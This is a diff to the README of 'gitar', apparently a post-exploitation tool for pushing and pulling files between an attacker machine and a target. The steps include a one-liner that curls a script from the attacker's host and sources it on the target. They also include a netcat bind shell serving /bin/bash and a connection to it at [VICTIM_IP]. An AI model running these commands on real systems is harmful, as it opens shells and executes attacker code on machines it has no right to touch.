@@ -37,8 +37,8 @@ The aim is to keep "target requirements" as fit as possible. Attacker machine re
 
 ### Steps
 
- 1. <sup>(Attacker machine)</sup> Launch the "server" : `./gitar -e [server_reachable_ip] -p [server_port]`
- 2. <sup>(Target machine)</sup> get shortcuts from `/alias` endpoint and source them. The one-liner corresponding would be provided in 1. step: `curl -s http://[attacker_ip:port]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias`
+ 1. <sup>(Attacker machine)</sup> Launch the "server" : `gitar -e [server_reachable_ip]`
+ 2. <sup>(Target machine)</sup> Get shortcuts and source them. The one-liner corresponding is by default copy on clipboard. It is also provided by step 1. (in gitar output): `curl -s http://[attacker_ip:port]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias`
 
 **And that's all, you can now `push`or `pull` file [🎶](#tldr---and-listen-music)**
 
@@ -46,7 +46,7 @@ The aim is to keep "target requirements" as fit as possible. Attacker machine re
 
 **~>** *Below are the steps to have shortcuts directly embedded in your `nc` reverse shell*
 1. <sup>(Target machine)</sup> Launch your classic listener: `nc -nvlp 4444 -e /bin/bash`
-2. <sup>(Attacker machine)</sup> Launch the "server" : `./gitar -e [server_reachable_ip] -p [server_port]` *(By default this will copy on clipboard the command to set up gitar exchange, also available in server output)*
+2. <sup>(Attacker machine)</sup> Launch the "server" : `gitar -e [server_reachable_ip]` *(By default this will copy on clipboard the command to set up gitar exchange, also available in server output)*
 3.  <sup>(Attacker machine)</sup> Connect to the reverse shell + load shortcut within:`nc [VICTIM_IP] 4444` then `CTRL+V` 
 
 An alternative is `export CMD=[CTRL+V] && (echo $CMD && cat) | nc [VICTIM_IP] 4444` *(Note: with `cat` you will not beneifit of bash completion)*
